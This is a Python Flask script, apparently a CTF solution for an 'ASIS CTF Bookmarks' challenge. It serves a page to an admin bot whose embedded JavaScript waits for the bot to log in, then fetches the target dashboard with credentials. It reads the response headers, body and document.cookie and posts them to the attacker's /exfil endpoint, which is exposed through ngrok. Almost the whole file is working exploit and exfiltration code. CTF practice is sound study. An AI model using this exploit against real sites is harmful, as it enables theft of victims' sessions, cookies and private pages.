#!/usr/bin/env python3
"""
ASIS CTF - Bookmarks Exploit - External Server Approach

Strategy:
1. Host a malicious HTML page on external server (ngrok)
2. Send that URL to bot
3. Bot visits our external page
4. Our page's JS makes bot navigate to http://65.109.202.184/dashboard
5. Bot then logs in as FLAG
6. Our JS (still running or via iframe/popup) reads bot's dashboard headers

Better approach:
1. Our external page opens target site in iframe/popup
2. Wait for bot to login
3. Try to read headers (won't work due to CORS)

ACTUAL BEST APPROACH:
The bot visits OUR URL first, then logs in.
We can make the bot visit a URL that we control, then have that page:
- Keep a WebSocket/SSE connection open
- After bot logs in, make another request to dashboard
- Exfiltrate via our external server

Let's use a simple Python HTTP server + ngrok
"""

from flask import Flask, request, Response
import sys

app = Flask(__name__)

# Store received data
received_data = []

@app.route('/')
def index():
    """
    This page will be visited by the bot
    It should:
    1. Wait for bot to complete login (8-10 seconds)
    2. Fetch /dashboard from target
    3. Send headers back to us
    """
    
    html = """
    <html>
    <head><title>Loading...</title></head>
    <body>
    <h1>Please wait...</h1>
    <script>
        // Send initial beacon
        fetch('/beacon?event=loaded&time=' + Date.now());
        
        // Wait for bot to login (happens after 5+ seconds)
        setTimeout(() => {
            fetch('/beacon?event=starting_fetch');
            
            // Now try to fetch target dashboard
            fetch('http://65.109.202.184/dashboard', {
                credentials: 'include',
                mode: 'cors'
            })
            .then(r => {
                // Try to read headers
                let headers = {};
                for(let [k,v] of r.headers.entries()) {
                    headers[k] = v;
                }
                
                return r.text().then(body => {
                    // Send everything back to our server
                    return fetch('/exfil', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            headers: headers,
                            body: body.substring(0, 1000),
                            cookies: document.cookie
                        })
                    });
                });
            })
            .then(() => fetch('/beacon?event=sent'))
            .catch(e => fetch('/beacon?event=error&msg=' + e.toString()));
            
        }, 10000);  // Wait 10 seconds for bot to login
    </script>
    </body>
    </html>
    """
    
    return html


@app.route('/beacon')
def beacon():
    """Receive beacons from bot"""
    event = request.args.get('event', 'unknown')
    print(f"[BEACON] {event} - {dict(request.args)}")
    received_data.append(('beacon', dict(request.args)))
    return "OK"


@app.route('/exfil', methods=['POST'])
def exfil():
    """Receive exfiltrated data"""
    data = request.get_json()
    print(f"\n{'='*70}")
    print(f"[EXFIL] Received data:")
    print(f"{'='*70}")
    print(f"Headers: {data.get('headers', {})}")
    print(f"Body preview: {data.get('body', '')[:200]}")
    print(f"Cookies: {data.get('cookies', '')}")
    print(f"{'='*70}\n")
    received_data.append(('exfil', data))
    return "OK"


@app.route('/data')
def show_data():
    """Show all received data"""
    output = "<h1>Received Data</h1><pre>"
    for dtype, data in received_data:
        output += f"\n[{dtype}] {data}\n"
    output += "</pre>"
    return output


if __name__ == "__main__":
    print("="*70)
    print("ASIS CTF - Bookmarks External Server")
    print("="*70)
    print("\n[*] Starting server on http://0.0.0.0:8000")
    print("[*] In another terminal, run: ngrok http 8000")
    print("[*] Then send the ngrok URL to the bot via /report")
    print("="*70)
    
    app.run(host='0.0.0.0', port=8000, debug=True)
